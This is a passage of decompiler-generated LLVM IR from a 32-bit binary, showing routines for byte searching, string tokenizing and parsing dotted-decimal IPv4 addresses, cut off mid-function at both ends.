  %v6_805515a = and i32 %v5_805515a, -256
  %v7_805515a = or i32 %v6_805515a, %v4_8055145
  store i32 %v7_805515a, i32* @edx, align 4
  %v1_805515e = inttoptr i32 %v1_8055159 to i8*
  %v2_805515e = load i8, i8* %v1_805515e, align 1
  %v15_805515e = icmp eq i8 %v2_805515e, %tmp
  br i1 %v15_805515e, label %dec_label_pc_80551ec, label %dec_label_pc_8055166

dec_label_pc_8055166:                             ; preds = %dec_label_pc_8055159
  %v1_8055166 = add i32 %v0_8055166, -1
  %v8_8055166 = icmp eq i32 %v1_8055166, 0
  br i1 %v8_8055166, label %dec_label_pc_805516f, label %dec_label_pc_805516b

dec_label_pc_805516b:                             ; preds = %dec_label_pc_8055140, %dec_label_pc_8055166
  %v0_8055166 = phi i32 [ %v1_8055166, %dec_label_pc_8055166 ], [ %arg3, %dec_label_pc_8055140 ]
  %v0_8055159 = phi i32 [ %v1_8055159, %dec_label_pc_8055166 ], [ %v2_8055155, %dec_label_pc_8055140 ]
  %v2_805516b = urem i32 %v0_8055159, 4
  %v3_805516b = icmp eq i32 %v2_805516b, 0
  %v1_805516d = icmp eq i1 %v3_805516b, false
  br i1 %v1_805516d, label %dec_label_pc_8055159, label %dec_label_pc_805516f

dec_label_pc_805516f:                             ; preds = %dec_label_pc_8055166, %dec_label_pc_805516b, %dec_label_pc_8055140
  %v0_80551d2.pr = phi i32 [ 0, %dec_label_pc_8055140 ], [ 0, %dec_label_pc_8055166 ], [ %v0_8055166, %dec_label_pc_805516b ]
  %v0_8055174 = phi i32 [ %v2_8055155, %dec_label_pc_8055140 ], [ %v1_8055159, %dec_label_pc_8055166 ], [ %v0_8055159, %dec_label_pc_805516b ]
  store i32 %v0_8055174, i32* @ecx, align 4
  %v2_8055178 = mul nuw nsw i32 %v4_8055145, 256
  %v2_805517b = or i32 %v2_8055178, %v4_8055145
  %v2_805517f = mul i32 %v2_805517b, 65536
  %v2_8055182 = or i32 %v2_805517f, %v2_805517b
  %v6_80551d553 = icmp ugt i32 %v0_80551d2.pr, 3
  br i1 %v6_80551d553, label %dec_label_pc_8055186, label %dec_label_pc_80551d7

dec_label_pc_8055186:                             ; preds = %dec_label_pc_805516f, %dec_label_pc_80551cf
  %v0_80551cf55 = phi i32 [ %v1_80551cf, %dec_label_pc_80551cf ], [ %v0_80551d2.pr, %dec_label_pc_805516f ]
  %v0_805518654 = phi i32 [ %v1_8055186, %dec_label_pc_80551cf ], [ %v0_8055174, %dec_label_pc_805516f ]
  %v1_8055186 = add i32 %v0_805518654, -4
  store i32 %v1_8055186, i32* @ecx, align 4
  %v2_805518b = inttoptr i32 %v1_8055186 to i32*
  %v3_805518b = load i32, i32* %v2_805518b, align 4
  %v4_805518b = xor i32 %v3_805518b, %v2_8055182
  %v1_805518d = add i32 %v4_805518b, 2130640639
  %v1_8055193 = sub i32 -1, %v4_805518b
  %v2_8055195 = xor i32 %v1_805518d, %v1_8055193
  %v1_8055197 = and i32 %v2_8055195, -2130640640
  %v2_8055197 = icmp eq i32 %v1_8055197, 0
  br i1 %v2_8055197, label %dec_label_pc_80551cf, label %dec_label_pc_805519f

dec_label_pc_805519f:                             ; preds = %dec_label_pc_8055186
  %v7_805519f = or i32 %v1_8055197, %v4_8055145
  %v1_80551a3 = add i32 %v0_805518654, -1
  %v2_80551a6 = inttoptr i32 %v1_80551a3 to i8*
  %v3_80551a6 = load i8, i8* %v2_80551a6, align 1
  %v16_80551a6 = icmp eq i8 %v3_80551a6, %tmp
  br i1 %v16_80551a6, label %dec_label_pc_80551ec, label %dec_label_pc_80551ab

dec_label_pc_80551ab:                             ; preds = %dec_label_pc_805519f
  %v1_80551af = add i32 %v0_805518654, -2
  %v2_80551b2 = inttoptr i32 %v1_80551af to i8*
  %v3_80551b2 = load i8, i8* %v2_80551b2, align 1
  %v16_80551b2 = icmp eq i8 %v3_80551b2, %tmp
  br i1 %v16_80551b2, label %dec_label_pc_80551ec, label %dec_label_pc_80551b7

dec_label_pc_80551b7:                             ; preds = %dec_label_pc_80551ab
  %v1_80551bb = add i32 %v0_805518654, -3
  %v2_80551be = inttoptr i32 %v1_80551bb to i8*
  %v3_80551be = load i8, i8* %v2_80551be, align 1
  %v16_80551be = icmp eq i8 %v3_80551be, %tmp
  br i1 %v16_80551be, label %dec_label_pc_80551ec, label %dec_label_pc_80551c3

dec_label_pc_80551c3:                             ; preds = %dec_label_pc_80551b7
  %v1_80551c7 = inttoptr i32 %v1_8055186 to i8*
  %v2_80551c7 = load i8, i8* %v1_80551c7, align 1
  %v15_80551c7 = icmp eq i8 %v2_80551c7, %tmp
  %v1_80551c9 = icmp eq i1 %v15_80551c7, false
  br i1 %v1_80551c9, label %dec_label_pc_80551cf, label %dec_label_pc_80551cb

dec_label_pc_80551cb:                             ; preds = %dec_label_pc_80551c3
  br label %dec_label_pc_80551ec

dec_label_pc_80551cf:                             ; preds = %dec_label_pc_80551c3, %dec_label_pc_8055186
  %v5_80551dc26 = phi i32 [ %v7_805519f, %dec_label_pc_80551c3 ], [ 0, %dec_label_pc_8055186 ]
  %v1_80551cf = add i32 %v0_80551cf55, -4
  %v6_80551d5 = icmp ugt i32 %v1_80551cf, 3
  br i1 %v6_80551d5, label %dec_label_pc_8055186, label %dec_label_pc_80551d7

dec_label_pc_80551d7:                             ; preds = %dec_label_pc_80551cf, %dec_label_pc_805516f
  %v5_80551dc25.lcssa = phi i32 [ %v4_8055145, %dec_label_pc_805516f ], [ %v5_80551dc26, %dec_label_pc_80551cf ]
  %v0_8055186.lcssa = phi i32 [ %v0_8055174, %dec_label_pc_805516f ], [ %v1_8055186, %dec_label_pc_80551cf ]
  %v0_80551cf.lcssa = phi i32 [ %v0_80551d2.pr, %dec_label_pc_805516f ], [ %v1_80551cf, %dec_label_pc_80551cf ]
  br label %dec_label_pc_80551e4

dec_label_pc_80551db:                             ; preds = %dec_label_pc_80551e4
  %v1_80551e4 = add i32 %v0_80551e4, -1
  %v1_80551db = add i32 %v0_80551db, -1
  %v6_80551dc = and i32 %v5_80551dc, -256
  %v7_80551dc = or i32 %v6_80551dc, %v4_8055145
  %v1_80551e0 = inttoptr i32 %v1_80551db to i8*
  %v2_80551e0 = load i8, i8* %v1_80551e0, align 1
  %v15_80551e0 = icmp eq i8 %v2_80551e0, %tmp
  br i1 %v15_80551e0, label %dec_label_pc_80551ec, label %dec_label_pc_80551e4

dec_label_pc_80551e4:                             ; preds = %dec_label_pc_80551db, %dec_label_pc_80551d7
  %v5_80551dc = phi i32 [ %v7_80551dc, %dec_label_pc_80551db ], [ %v5_80551dc25.lcssa, %dec_label_pc_80551d7 ]
  %v0_80551db = phi i32 [ %v1_80551db, %dec_label_pc_80551db ], [ %v0_8055186.lcssa, %dec_label_pc_80551d7 ]
  %v0_80551e4 = phi i32 [ %v1_80551e4, %dec_label_pc_80551db ], [ %v0_80551cf.lcssa, %dec_label_pc_80551d7 ]
  %v10_80551e5 = icmp eq i32 %v0_80551e4, 0
  %v1_80551e8 = icmp eq i1 %v10_80551e5, false
  br i1 %v1_80551e8, label %dec_label_pc_80551db, label %dec_label_pc_80551ea

dec_label_pc_80551ea:                             ; preds = %dec_label_pc_80551e4
  br label %dec_label_pc_80551ec

dec_label_pc_80551ec:                             ; preds = %dec_label_pc_8055159, %dec_label_pc_80551b7, %dec_label_pc_80551ab, %dec_label_pc_805519f, %dec_label_pc_80551db, %dec_label_pc_80551cb, %dec_label_pc_80551ea
  %v0_80551ef = phi i32 [ %v1_8055186, %dec_label_pc_80551cb ], [ 0, %dec_label_pc_80551ea ], [ %v1_80551db, %dec_label_pc_80551db ], [ %v1_80551bb, %dec_label_pc_80551b7 ], [ %v1_80551af, %dec_label_pc_80551ab ], [ %v1_80551a3, %dec_label_pc_805519f ], [ %v1_8055159, %dec_label_pc_8055159 ]
  ret i32 %v0_80551ef

; uselistorder directives
  uselistorder i32 %v0_80551e4, { 1, 0 }
  uselistorder i32 %v1_80551cf, { 0, 2, 1 }
  uselistorder i32 %v1_8055186, { 2, 0, 3, 4, 5, 1 }
  uselistorder i32 %v0_805518654, { 3, 2, 1, 0 }
  uselistorder i32 %v2_805517b, { 1, 0 }
  uselistorder i32 %v0_8055159, { 1, 0, 2 }
  uselistorder i32 %v2_8055155, { 1, 0 }
  uselistorder i32 %v4_8055145, { 4, 5, 3, 2, 0, 1 }
  uselistorder i8 %tmp, { 5, 1, 2, 3, 4, 0 }
  uselistorder i32 %arg3, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80551ec, { 6, 4, 5, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8055186, { 1, 0 }
  uselistorder label %dec_label_pc_805516f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805516b, { 1, 0 }
}

define i32 @function_80551f0(i8* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_80551f0:
  %eax.global-to-local = alloca i32, align 4
  %v4_80551f3 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80551f3, i32* @ebx, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @esi, align 4
  %v1_80551ff = icmp eq i8* %arg1, null
  %v1_8055201 = icmp eq i1 %v1_80551ff, false
  br i1 %v1_8055201, label %dec_label_pc_8055205, label %dec_label_pc_8055203

dec_label_pc_8055203:                             ; preds = %dec_label_pc_80551f0
  %v1_8055203 = inttoptr i32 %arg3 to i32*
  %v2_8055203 = load i32, i32* %v1_8055203, align 4
  store i32 %v2_8055203, i32* @ebx, align 4
  br label %dec_label_pc_8055205

dec_label_pc_8055205:                             ; preds = %dec_label_pc_80551f0, %dec_label_pc_8055203
  %v0_8055208 = phi i32 [ %v4_80551f3, %dec_label_pc_80551f0 ], [ %v2_8055203, %dec_label_pc_8055203 ]
  %v0_8055205 = load i32, i32* @ecx, align 4
  %v5_8055208 = inttoptr i32 %v0_8055208 to i8*
  %v8_8055209 = call i32 @function_8056668(i8* %v5_8055208, i32 %arg2, i32 %v0_8055205, i32 %v0_8055205)
  store i32 %v8_8055209, i32* %eax.global-to-local, align 4
  %v0_8055211 = load i32, i32* @ebx, align 4
  %v2_8055211 = add i32 %v0_8055211, %v8_8055209
  store i32 %v2_8055211, i32* @ebx, align 4
  %v1_8055213 = inttoptr i32 %v2_8055211 to i8*
  %v2_8055213 = load i8, i8* %v1_8055213, align 1
  %v3_8055213 = icmp eq i8 %v2_8055213, 0
  %v1_8055216 = icmp eq i1 %v3_8055213, false
  br i1 %v1_8055216, label %dec_label_pc_805521e, label %dec_label_pc_8055218

dec_label_pc_8055218:                             ; preds = %dec_label_pc_8055205
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_805521a = load i32, i32* @esi, align 4
  %v2_805521a = inttoptr i32 %v1_805521a to i32*
  store i32 %v2_8055211, i32* %v2_805521a, align 4
  %v0_8055248.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055245

dec_label_pc_805521e:                             ; preds = %dec_label_pc_8055205
  %v0_805521e = load i32, i32* @edx, align 4
  %v0_8055220 = load i32, i32* @edi, align 4
  %v8_8055222 = call i32 @function_805524c(i8* %v1_8055213, i32 %v0_8055220, i32 %v0_805521e, i32 %v0_805521e)
  store i32 %v8_8055222, i32* %eax.global-to-local, align 4
  %v2_805522a = icmp eq i32 %v8_8055222, 0
  %v1_805522c = icmp eq i1 %v2_805522a, false
  br i1 %v1_805522c, label %dec_label_pc_805523d, label %dec_label_pc_805522e

dec_label_pc_805522e:                             ; preds = %dec_label_pc_805521e
  %v0_8055232 = load i32, i32* @ebx, align 4
  %v5_8055232 = inttoptr i32 %v0_8055232 to i8*
  %v8_8055233 = call i32 @function_8056604(i8* %v5_8055232, i32 0, i32 %v8_8055222, i32 %v8_8055222)
  br label %dec_label_pc_8055241

dec_label_pc_805523d:                             ; preds = %dec_label_pc_805521e
  %v9_8055222 = inttoptr i32 %v8_8055222 to i8*
  store i8 0, i8* %v9_8055222, align 1
  %v2_8055240 = add i32 %v8_8055222, 1
  br label %dec_label_pc_8055241

dec_label_pc_8055241:                             ; preds = %dec_label_pc_805522e, %dec_label_pc_805523d
  %storemerge = phi i32 [ %v2_8055240, %dec_label_pc_805523d ], [ %v8_8055233, %dec_label_pc_805522e ]
  %v0_8055241 = phi i32 [ %v2_8055240, %dec_label_pc_805523d ], [ %v8_8055233, %dec_label_pc_805522e ]
  store i32 %storemerge, i32* %eax.global-to-local, align 4
  %v1_8055241 = load i32, i32* @esi, align 4
  %v2_8055241 = inttoptr i32 %v1_8055241 to i32*
  store i32 %v0_8055241, i32* %v2_8055241, align 4
  %v0_8055243 = load i32, i32* @ebx, align 4
  store i32 %v0_8055243, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8055245

dec_label_pc_8055245:                             ; preds = %dec_label_pc_8055218, %dec_label_pc_8055241
  %v0_8055248 = phi i32 [ %v0_8055248.pre, %dec_label_pc_8055218 ], [ %v0_8055243, %dec_label_pc_8055241 ]
  ret i32 %v0_8055248

; uselistorder directives
  uselistorder i32 %v8_8055222, { 3, 5, 0, 1, 2, 4 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055245, { 1, 0 }
  uselistorder label %dec_label_pc_8055241, { 1, 0 }
  uselistorder label %dec_label_pc_8055205, { 1, 0 }
}

define i32 @function_805524c(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_805524c:
  %v0_805524d = load i32, i32* @ebx, align 4
  %v2_805526425 = load i8, i8* %arg1, align 1
  %v4_805526629 = icmp eq i8 %v2_805526425, 0
  br i1 %v4_805526629, label %dec_label_pc_805526e, label %dec_label_pc_805526a.lr.ph

dec_label_pc_805526a.lr.ph:                       ; preds = %dec_label_pc_805524c
  %v3_805526426 = zext i8 %v2_805526425 to i32
  %v5_805526427 = and i32 %v0_805524d, -256
  %v6_805526428 = or i32 %v3_805526426, %v5_805526427
  %v4_8055252 = ptrtoint i8* %arg1 to i32
  %v1_805525d13 = inttoptr i32 %arg2 to i8*
  %v4_805525d.pre.pre = load i32, i32* @ecx, align 4
  br label %dec_label_pc_805526a

dec_label_pc_8055258:                             ; preds = %dec_label_pc_805526a, %dec_label_pc_805525c
  %v6_805525d23 = phi i32 [ %v6_805525d, %dec_label_pc_805525c ], [ %v6_805525d17, %dec_label_pc_805526a ]
  %v2_805525d22 = phi i8 [ %v2_805525d, %dec_label_pc_805525c ], [ %v2_805525d14, %dec_label_pc_805526a ]
  %v0_805525c21 = phi i32 [ %v1_805525c, %dec_label_pc_805525c ], [ %arg2, %dec_label_pc_805526a ]
  %v15_8055258 = icmp eq i8 %v2_805525d22, %v2_805526433
  br i1 %v15_8055258, label %dec_label_pc_8055270, label %dec_label_pc_805525c

dec_label_pc_805525c:                             ; preds = %dec_label_pc_8055258
  %v1_805525c = add i32 %v0_805525c21, 1
  %v1_805525d = inttoptr i32 %v1_805525c to i8*
  %v2_805525d = load i8, i8* %v1_805525d, align 1
  %v3_805525d = zext i8 %v2_805525d to i32
  %v5_805525d = and i32 %v6_805525d23, -256
  %v6_805525d = or i32 %v3_805525d, %v5_805525d
  %v4_805525f = icmp eq i8 %v2_805525d, 0
  %v1_8055261 = icmp eq i1 %v4_805525f, false
  br i1 %v1_8055261, label %dec_label_pc_8055258, label %dec_label_pc_8055263

dec_label_pc_8055263:                             ; preds = %dec_label_pc_805525c, %dec_label_pc_805526a
  %v4_805525d.pre36 = phi i32 [ %v6_805525d17, %dec_label_pc_805526a ], [ %v6_805525d, %dec_label_pc_805525c ]
  %v1_8055263 = add i32 %v0_805526331, 1
  %v1_8055264 = inttoptr i32 %v1_8055263 to i8*
  %v2_8055264 = load i8, i8* %v1_8055264, align 1
  %v3_8055264 = zext i8 %v2_8055264 to i32
  %v5_8055264 = and i32 %v6_805526434, -256
  %v6_8055264 = or i32 %v3_8055264, %v5_8055264
  %v4_8055266 = icmp eq i8 %v2_8055264, 0
  br i1 %v4_8055266, label %dec_label_pc_805526e, label %dec_label_pc_805526a

dec_label_pc_805526a:                             ; preds = %dec_label_pc_805526a.lr.ph, %dec_label_pc_8055263
  %v4_805525d.pre = phi i32 [ %v4_805525d.pre.pre, %dec_label_pc_805526a.lr.ph ], [ %v4_805525d.pre36, %dec_label_pc_8055263 ]
  %v6_805526434 = phi i32 [ %v6_805526428, %dec_label_pc_805526a.lr.ph ], [ %v6_8055264, %dec_label_pc_8055263 ]
  %v2_805526433 = phi i8 [ %v2_805526425, %dec_label_pc_805526a.lr.ph ], [ %v2_8055264, %dec_label_pc_8055263 ]
  %v0_805526331 = phi i32 [ %v4_8055252, %dec_label_pc_805526a.lr.ph ], [ %v1_8055263, %dec_label_pc_8055263 ]
  %v2_805525d14 = load i8, i8* %v1_805525d13, align 1
  %v3_805525d15 = zext i8 %v2_805525d14 to i32
  %v5_805525d16 = and i32 %v4_805525d.pre, -256
  %v6_805525d17 = or i32 %v3_805525d15, %v5_805525d16
  %v4_805525f18 = icmp eq i8 %v2_805525d14, 0
  %v1_805526120 = icmp eq i1 %v4_805525f18, false
  br i1 %v1_805526120, label %dec_label_pc_8055258, label %dec_label_pc_8055263

dec_label_pc_805526e:                             ; preds = %dec_label_pc_8055263, %dec_label_pc_805524c
  br label %dec_label_pc_8055270

dec_label_pc_8055270:                             ; preds = %dec_label_pc_8055258, %dec_label_pc_805526e
  %v0_8055272 = phi i32 [ 0, %dec_label_pc_805526e ], [ %v0_805526331, %dec_label_pc_8055258 ]
  store i32 %v0_805524d, i32* @ebx, align 4
  ret i32 %v0_8055272

; uselistorder directives
  uselistorder i8 %v2_805525d14, { 1, 2, 0 }
  uselistorder i32 %v1_8055263, { 1, 0 }
  uselistorder i32 %v6_805525d, { 1, 0 }
  uselistorder i8 %v2_805525d, { 1, 2, 0 }
  uselistorder i32 %v1_805525c, { 1, 0 }
  uselistorder i8 %v2_805526425, { 0, 2, 1 }
  uselistorder i32 %v0_805524d, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055270, { 1, 0 }
  uselistorder label %dec_label_pc_805526a, { 1, 0 }
  uselistorder label %dec_label_pc_8055263, { 1, 0 }
}

define i32 @function_8055274(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_8055274:
  %v4_805527b = ptrtoint i8* %arg1 to i32
  store i32 %v4_805527b, i32* @ecx, align 4
  %v1_805527f = icmp eq i8* %arg1, null
  br i1 %v1_805527f, label %dec_label_pc_8055300, label %dec_label_pc_8055283

dec_label_pc_8055283:                             ; preds = %dec_label_pc_8055274
  %v0_805528e.pre = load i32, i32* @global_var_805e61c, align 4
  br label %dec_label_pc_805528e

dec_label_pc_805528e:                             ; preds = %dec_label_pc_8055283, %dec_label_pc_80552d7
  %v2_80552d734 = phi i32 [ 1, %dec_label_pc_8055283 ], [ %v3_80552d7, %dec_label_pc_80552d7 ]
  %v0_805529433 = phi i32 [ %v4_805527b, %dec_label_pc_8055283 ], [ %v0_80552943, %dec_label_pc_80552d7 ]
  %v0_80552f532 = phi i32 [ 0, %dec_label_pc_8055283 ], [ %v2_80552dd, %dec_label_pc_80552d7 ]
  %v1_8055294 = inttoptr i32 %v0_805529433 to i8*
  %v2_8055294 = load i8, i8* %v1_8055294, align 1
  %v3_8055294 = sext i8 %v2_8055294 to i32
  %v2_8055297 = mul nsw i32 %v3_8055294, 2
  %v3_8055297 = add i32 %v2_8055297, %v0_805528e.pre
  %v4_8055297 = inttoptr i32 %v3_8055297 to i8*
  %v5_8055297 = load i8, i8* %v4_8055297, align 1
  %v6_8055297 = and i8 %v5_8055297, 8
  %v7_8055297 = icmp eq i8 %v6_8055297, 0
  br i1 %v7_8055297, label %dec_label_pc_8055300, label %dec_label_pc_805529e

dec_label_pc_805529e:                             ; preds = %dec_label_pc_805528e
  %v4_80552b2.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_80552b2

dec_label_pc_80552a2:                             ; preds = %dec_label_pc_80552b2
  %v3_80552a2 = mul i32 %v1_80552a2, 10
  %v2_80552a5 = add i32 %v3_80552a2, -48
  %v3_80552a5 = add i32 %v2_80552a5, %v2_80552b4
  %v1_80552a9 = add i32 %v3_80552a5, -255
  %v6_80552a9 = sub i32 254, %v3_80552a5
  %v7_80552a9 = and i32 %v6_80552a9, %v3_80552a5
  %v8_80552a9 = icmp slt i32 %v7_80552a9, 0
  %v9_80552a9 = icmp eq i32 %v1_80552a9, 0
  %v10_80552a9 = icmp slt i32 %v1_80552a9, 0
  %v3_80552af = icmp eq i1 %v10_80552a9, %v8_80552a9
  %v4_80552af = icmp eq i1 %v9_80552a9, false
  %v5_80552af = and i1 %v4_80552af, %v3_80552af
  br i1 %v5_80552af, label %dec_label_pc_8055300, label %dec_label_pc_80552b1

dec_label_pc_80552b1:                             ; preds = %dec_label_pc_80552a2
  %v1_80552b1 = add i32 %v0_80552b1, 1
  store i32 %v1_80552b1, i32* @ecx, align 4
  br label %dec_label_pc_80552b2

dec_label_pc_80552b2:                             ; preds = %dec_label_pc_805529e, %dec_label_pc_80552b1
  %v1_80552a2 = phi i32 [ 0, %dec_label_pc_805529e ], [ %v3_80552a5, %dec_label_pc_80552b1 ]
  %v4_80552b2 = phi i32 [ %v4_80552b2.pre, %dec_label_pc_805529e ], [ %v6_80552b2, %dec_label_pc_80552b1 ]
  %v0_80552b1 = phi i32 [ %v0_805529433, %dec_label_pc_805529e ], [ %v1_80552b1, %dec_label_pc_80552b1 ]
  %v1_80552b2 = inttoptr i32 %v0_80552b1 to i8*
  %v2_80552b2 = load i8, i8* %v1_80552b2, align 1
  %v3_80552b2 = zext i8 %v2_80552b2 to i32
  %v5_80552b2 = and i32 %v4_80552b2, -256
  %v6_80552b2 = or i32 %v3_80552b2, %v5_80552b2
  store i32 %v6_80552b2, i32* @edx, align 4
  %v2_80552b4 = sext i8 %v2_80552b2 to i32
  %v2_80552b7 = mul nsw i32 %v2_80552b4, 2
  %v3_80552b7 = add i32 %v2_80552b7, %v0_805528e.pre
  %v4_80552b7 = inttoptr i32 %v3_80552b7 to i16*
  %v5_80552b7 = load i16, i16* %v4_80552b7, align 2
  %v2_80552bc = and i16 %v5_80552b7, 8
  %v3_80552bc = icmp eq i16 %v2_80552bc, 0
  %v1_80552be = icmp eq i1 %v3_80552bc, false
  br i1 %v1_80552be, label %dec_label_pc_80552a2, label %dec_label_pc_80552c0

dec_label_pc_80552c0:                             ; preds = %dec_label_pc_80552b2
  %v8_80552c0 = sub nsw i32 2, %v2_80552d734
  %v9_80552c0 = and i32 %v8_80552c0, %v2_80552d734
  %v10_80552c0 = icmp slt i32 %v9_80552c0, 0
  %v11_80552c0 = icmp eq i32 %v2_80552d734, 3
  %v12_80552c0 = icmp slt i32 %v2_80552d734, 3
  %v3_80552c4 = icmp eq i1 %v12_80552c0, %v10_80552c0
  %v4_80552c4 = icmp eq i1 %v11_80552c0, false
  %v5_80552c4 = and i1 %v4_80552c4, %v3_80552c4
  br i1 %v5_80552c4, label %dec_label_pc_80552ce, label %dec_label_pc_80552c6

dec_label_pc_80552c6:                             ; preds = %dec_label_pc_80552c0
  %v10_80552c6 = icmp eq i8 %v2_80552b2, 46
  %v1_80552c9 = icmp eq i1 %v10_80552c6, false
  br i1 %v1_80552c9, label %dec_label_pc_8055300, label %dec_label_pc_80552cb

dec_label_pc_80552cb:                             ; preds = %dec_label_pc_80552c6
  %v1_80552cb = add i32 %v0_80552b1, 1
  store i32 %v1_80552cb, i32* @ecx, align 4
  br label %dec_label_pc_80552d7

dec_label_pc_80552ce:                             ; preds = %dec_label_pc_80552c0
  %v1_80552ce = add i32 %v0_80552b1, 1
  store i32 %v1_80552ce, i32* @ecx, align 4
  %v4_80552cf = icmp eq i8 %v2_80552b2, 0
  br i1 %v4_80552cf, label %dec_label_pc_80552d7, label %dec_label_pc_80552d3

dec_label_pc_80552d3:                             ; preds = %dec_label_pc_80552ce
  %v2_80552d3 = and i16 %v5_80552b7, 32
  %v3_80552d3 = icmp eq i16 %v2_80552d3, 0
  br i1 %v3_80552d3, label %dec_label_pc_8055300, label %dec_label_pc_80552d7

dec_label_pc_80552d7:                             ; preds = %dec_label_pc_80552d3, %dec_label_pc_80552ce, %dec_label_pc_80552cb
  %v0_80552943 = phi i32 [ %v1_80552ce, %dec_label_pc_80552d3 ], [ %v1_80552ce, %dec_label_pc_80552ce ], [ %v1_80552cb, %dec_label_pc_80552cb ]
  %v3_80552d7 = add nuw nsw i32 %v2_80552d734, 1
  %v2_80552da = mul i32 %v0_80552f532, 256
  %v2_80552dd = or i32 %v1_80552a2, %v2_80552da
  %v7_80552e3 = icmp sgt i32 %v2_80552d734, 3
  br i1 %v7_80552e3, label %dec_label_pc_80552e5, label %dec_label_pc_805528e

dec_label_pc_80552e5:                             ; preds = %dec_label_pc_80552d7
  %v4_80552e5 = icmp eq i32 %arg2, 0
  br i1 %v4_80552e5, label %dec_label_pc_8055302, label %dec_label_pc_80552f1

dec_label_pc_80552f1:                             ; preds = %dec_label_pc_80552e5
  %v1_80552f5 = call i32 @llvm.bswap.i32(i32 %v2_80552dd)
  %v2_80552f7 = inttoptr i32 %arg2 to i32*
  store i32 %v1_80552f5, i32* %v2_80552f7, align 4
  br label %dec_label_pc_8055302

dec_label_pc_8055300:                             ; preds = %dec_label_pc_80552d3, %dec_label_pc_80552c6, %dec_label_pc_805528e, %dec_label_pc_80552a2, %dec_label_pc_8055274
  br label %dec_label_pc_8055302

dec_label_pc_8055302:                             ; preds = %dec_label_pc_80552e5, %dec_label_pc_80552f1, %dec_label_pc_8055300
  %v0_8055307 = phi i32 [ 1, %dec_label_pc_80552e5 ], [ 1, %dec_label_pc_80552f1 ], [ 0, %dec_label_pc_8055300 ]
  ret i32 %v0_8055307

; uselistorder directives
  uselistorder i32 %v2_80552b4, { 1, 0 }
  uselistorder i32 %v6_80552b2, { 1, 0 }
  uselistorder i8 %v2_80552b2, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80552b1, { 0, 1, 3, 2 }
  uselistorder i32 %v1_80552a9, { 1, 0 }
  uselistorder i32 %v3_80552a5, { 1, 0, 3, 2 }
  uselistorder i32 %v0_805529433, { 1, 0 }
  uselistorder i32 %v2_80552d734, { 1, 4, 2, 0, 5, 3 }
  uselistorder i32 (i32)* @llvm.bswap.i32, { 3, 2, 1, 0 }
  uselistorder i32 -255, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8055302, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8055300, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_80552b2, { 1, 0 }
  uselistorder label %dec_label_pc_805528e, { 1, 0 }
}

define i32 @function_8055308(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_8055308:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp33 = sext i32 %arg2 to i64
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %stack_var_-252 = alloca i32, align 4
  store i32 %arg3, i32* @edi, align 4
  store i32 512, i32* %stack_var_-252, align 4
  %v1_805531e = call i32 @function_80529ba(i32 512)
  store i32 %v1_805531e, i32* %eax.global-to-local, align 4
  store i32 1025, i32* %stack_var_-252, align 4
  store i32 %v1_805531e, i32* @ebp, align 4
  %v1_805532c = call i32 @function_80529ba(i32 1025)
  store i32 %v1_805532c, i32* %eax.global-to-local, align 4
  %v12_8055335 = ptrtoint i32* %stack_var_-236 to i32
  %v1_8055338 = icmp eq i32 %v1_805531e, 0
  br i1 %v1_8055338, label %dec_label_pc_80559b1, label %dec_label_pc_8055340

dec_label_pc_8055340:                             ; preds = %dec_label_pc_8055308
  %v1_8055340 = icmp eq i32 %v1_805532c, 0
  br i1 %v1_8055340, label %dec_label_pc_80559b1, label %dec_label_pc_8055348

dec_label_pc_8055348:                             ; preds = %dec_label_pc_8055340
  %v5_8055348 = icmp eq i32 %arg2, 0
  br i1 %v5_8055348, label %dec_label_pc_80559b1, label %dec_label_pc_8055356

dec_label_pc_8055356:                             ; preds = %dec_label_pc_8055348
  %v4_8055356 = ptrtoint i8* %arg1 to i32
  store i32 %v4_8055356, i32* %eax.global-to-local, align 4
  %v2_805535d = load i8, i8* %arg1, align 1
  %v3_805535d = icmp eq i8 %v2_805535d, 0
  br i1 %v3_805535d, label %dec_label_pc_80559b1, label %dec_label_pc_8055366

dec_label_pc_8055366:                             ; preds = %dec_label_pc_8055356
  store i32 %v4_8055356, i32* %stack_var_-252, align 4
  %v2_805536a = call i32 @function_8051ef8(i8* nonnull %arg1)
  store i32 %v2_805536a, i32* @eax, align 4
  store i32 %v4_8055356, i32* %edx.global-to-local, align 4
  %v2_805538d = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_805538d, i32* @ebx, align 4
  store i32 %v2_805538d, i32* %stack_var_-252, align 4
  %v2_8055395 = call i32 @function_805405a(i32 %v2_805538d, i32 134561879)
  store i32 %v2_8055395, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8064b28.399 to i32), i32* %stack_var_-252, align 4
  %v1_80553a1 = call i32 @function_8054057(i32 ptrtoint (i32* @global_var_8064b28.399 to i32))
  %v0_80553a6 = load i64, i64* @global_var_8064b40.400, align 8
  %v1_80553a6 = trunc i64 %v0_80553a6 to i32
  %v1_80553ab = ashr i32 %v1_80553a6, 31
